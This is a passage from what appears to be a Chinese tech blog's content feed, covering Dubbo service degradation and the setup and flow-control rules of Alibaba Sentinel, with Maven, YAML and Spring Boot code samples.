class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注入Service</span></span><br><span class="line">    <span class="comment">//@Autowired//本地注入</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1. 从zookeeper注册中心获取userService的访问url</span></span><br><span class="line"><span class="comment">        2. 进行远程调用RPC</span></span><br><span class="line"><span class="comment">        3. 将结果封装为一个代理对象。给变量赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span>(cluster = <span class="string">"failover"</span>)<span class="comment">//远程注入</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello dubbo hello!~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"3..."</span>);</span><br><span class="line">        <span class="comment">//查询User对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"zhangsan"</span>,<span class="string">"123"</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            Thread.sleep(3000);</span></span><br><span class="line"><span class="comment">        &#125; catch (InterruptedException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dubbo服务降级"><a href="#Dubbo服务降级" class="headerlink" title="Dubbo服务降级"></a>Dubbo服务降级</h3><p>官网地址[<a href="https://dubbo.apache.org/zh/docs/advanced/service-downgrade/" target="_blank" rel="noopener">https://dubbo.apache.org/zh/docs/advanced/service-downgrade/</a>]</p><ul><li><code>mock=force:return null</code> 表示消费方对该服务的方法调用都直接返回 null 值，不发起远程调用。用来屏蔽不重要服务不可用时对调用方的影响。</li><li>还可以改为 <code>mock=fail:return null</code> 表示消费方对该服务的方法调用在失败后，再返回 null 值，不抛异常。用来容忍不重要服务不稳定时对调用方的影响。</li></ul><p>client：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference</span>(mock=force:<span class="keyword">return</span> <span class="keyword">null</span>)<span class="comment">//不再去调用userService服务</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sayHello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/find"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">find</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> userService.findUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sentinel服务熔断与限流</title>
      <link href="/2021/11/10/Sentinel%E6%9C%8D%E5%8A%A1%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7%E4%B8%8E%E9%99%90%E6%B5%81/"/>
      <url>/2021/11/10/Sentinel%E6%9C%8D%E5%8A%A1%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7%E4%B8%8E%E9%99%90%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Sentinel简介"><a href="#Sentinel简介" class="headerlink" title="Sentinel简介"></a>Sentinel简介</h2><p><a href="https://github.com/alibaba/Sentinel" target="_blank" rel="noopener">官方Github</a></p><p><a href="https://sentinelguard.io/zh-cn/docs/introduction.html" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>Sentinel 是什么？</p><p>随着微服务的流行，服务和服务之间的稳定性变得越来越重要。Sentinel 以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。</p><p>Sentinel 具有以下特征:</p><p>丰富的应用场景：Sentinel 承接了阿里巴巴近 10 年的双十一大促流量的核心场景，例如秒杀（即突发流量控制在系统容量可以承受的范围）、消息削峰填谷、集群流量控制、实时熔断下游不可用应用等。<br>完备的实时监控：Sentinel 同时提供实时的监控功能。您可以在控制台中看到接入应用的单台机器秒级数据，甚至 500 台以下规模的集群的汇总运行情况。<br>广泛的开源生态：Sentinel 提供开箱即用的与其它开源框架/库的整合模块，例如与 Spring Cloud、Dubbo、gRPC 的整合。您只需要引入相应的依赖并进行简单的配置即可快速地接入 Sentinel。<br>完善的 SPI 扩展点：Sentinel 提供简单易用、完善的 SPI 扩展接口。您可以通过实现扩展接口来快速地定制逻辑。例如定制规则管理、适配动态数据源等。<br>Sentinel 的主要特性：<br><img src="../img/sentinel/sentinel0.png" alt=""></p></blockquote><p>Hystrix与Sentinel比较：</p><ul><li>Hystrix<ol><li>需要我们程序员自己手工搭建监控平台</li><li>没有一套可以细粒度化得配置流控、速率控制、服务熔断、服务降级的web界面</li></ol></li><li>Sentinel<ol><li>单独一个组件，可以独立出来。</li><li>直接界面化的细粒度统一配置。</li></ol></li></ul><h2 id="Sentinel下载安装运行"><a href="#Sentinel下载安装运行" class="headerlink" title="Sentinel下载安装运行"></a>Sentinel下载安装运行</h2><p><a href="https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_sentinel" target="_blank" rel="noopener">官方文档</a></p><p>服务使用中的各种问题：</p><ul><li>服务雪崩</li><li>服务降级</li><li>服务熔断</li><li>服务限流</li></ul><p>Sentinel 分为两个部分：</p><ul><li><p>核心库（Java 客户端）不依赖任何框架/库，能够运行于所有 Java 运行时环境，同时对 Dubbo / Spring Cloud 等框架也有较好的支持。</p></li><li><p>控制台（Dashboard）基于 Spring Boot 开发，打包后可以直接运行，不需要额外的 Tomcat 等应用容器。</p></li></ul><p><strong>安装步骤：</strong></p><p>下载</p><ul><li><a href="https://github.com/alibaba/Sentinel/releases" target="_blank" rel="noopener">https://github.com/alibaba/Sentinel/releases</a></li><li>下载到本地sentinel-dashboard-1.7.0.jar</li></ul><p>运行命令</p><ul><li>前提<ul><li>Java 8 环境</li><li>8080端口不能被占用</li></ul></li><li>命令<ul><li>java -jar sentinel-dashboard-1.7.0.jar</li></ul></li><li>访问Sentinel管理界面<ul><li>localhost:8080</li><li>登录账号密码均为sentinel</li></ul></li></ul><h2 id="Sentinel初始化监控"><a href="#Sentinel初始化监控" class="headerlink" title="Sentinel初始化监控"></a>Sentinel初始化监控</h2><p><strong>启动Nacos8848成功</strong></p><p><strong>新建工程 - cloudalibaba-sentinel-service8401</strong></p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud2020<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloudalibaba-sentinel-service8401<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="comment">&lt;!-- 引入自己定义的api通用包，可以使用Payment支付Entity --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringCloud ailibaba sentinel-datasource-nacos 后续做持久化用到--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringCloud ailibaba sentinel --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringBoot整合Web组件+actuator --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日常通用jar包配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8401</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span> <span class="comment">#配置Sentinel dashboard地址</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">'*'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 激活Sentinel对Feign的支持</span></span><br></pre></td></tr></table></figure><p>主启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp8401</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MainApp8401<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.csp.sentinel.annotation.SentinelResource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.csp.sentinel.slots.block.BlockException;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testA"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testA</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testA"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/testB"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testB</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        log.info(Thread.currentThread().getName()+<span class="string">"\t"</span>+<span class="string">"...testB"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"------testB"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>启动Sentinel8080 - <code>java -jar sentinel-dashboard-1.7.0.jar</code></strong></p><p><strong>启动微服务8401</strong></p><p><strong>启动8401微服务后查看sentienl控制台</strong></p><ul><li>刚启动，空空如也，啥都没有</li></ul><p><img src="../img/sentinel/sentinel1.png" alt=""></p><ul><li>Sentinel采用的懒加载说明<ul><li>执行一次访问即可<ul><li><a href="http://localhost:8401/testA" target="_blank" rel="noopener">http://localhost:8401/testA</a></li><li><a href="http://localhost:8401/testB" target="_blank" rel="noopener">http://localhost:8401/testB</a></li></ul></li><li>效果 - sentinel8080正在监控微服务8401</li></ul></li></ul><p><img src="../img/sentinel/sentinel2.png" alt=""></p><h2 id="Sentinel流控规则简介"><a href="#Sentinel流控规则简介" class="headerlink" title="Sentinel流控规则简介"></a>Sentinel流控规则简介</h2><p>基本介绍</p><p><img src="../img/sentinel/sentinel3.png" alt=""></p><p>进一步解释说明：</p><ul><li>资源名：唯一名称，默认请求路径。</li><li>针对来源：Sentinel可以针对调用者进行限流，填写微服务名，默认default（不区分来源）。</li><li>阈值类型/单机阈值：<ul><li>QPS(每秒钟的请求数量)︰当调用该API的QPS达到阈值的时候，进行限流。</li><li>线程数：当调用该API的线程数达到阈值的时候，进行限流。</li></ul></li><li>是否集群：不需要集群。</li><li>流控模式：<ul><li>直接：API达到限流条件时，直接限流。</li><li>关联：当关联的资源达到阈值时，就限流自己。</li><li>链路：只记录指定链路上的流量（指定资源从入口资源进来的流量，如果达到阈值，就进行限流)【API级别的针对来源】。</li></ul></li><li>流控效果：<ul><li>快速失败：直接失败，抛异常。</li><li>Warm up：根据Code Factor（冷加载因子，默认3）的值，从阈值/codeFactor，经过预热时长，才达到设置的QPS阈值。</li><li>排队等待：匀速排队，让请求以匀速的速度通过，阈值类型必须设置为QPS，否则无效。</li></ul></li></ul><h3 id="Sentinel流控-QPS直接失败"><a href="#Sentinel流控-QPS直接失败" class="headerlink" title="Sentinel流控-QPS直接失败"></a>Sentinel流控-QPS直接失败</h3><p><strong>直接 -&gt; 快速失败（系统默认）</strong></p><p><strong>配置及说明</strong></p><p>表示1秒钟内查询1次就是OK，若超过次数1，就直接-&gt;快速失败，报默认错误</p><p><img src="../img/sentinel/sentinel4.png" alt=""></p><p>测试</p><p>快速多次点击访问<a href="http://localhost:8401/testA" target="_blank" rel="noopener">http://localhost:8401/testA</a></p><p>结果</p><p>返回页面 Blocked by Sentinel (flow limiting)</p><h3 id="Sentinel流控-线程数直接失败"><a href="#Sentinel流控-线程数直接失败" class="headerlink" 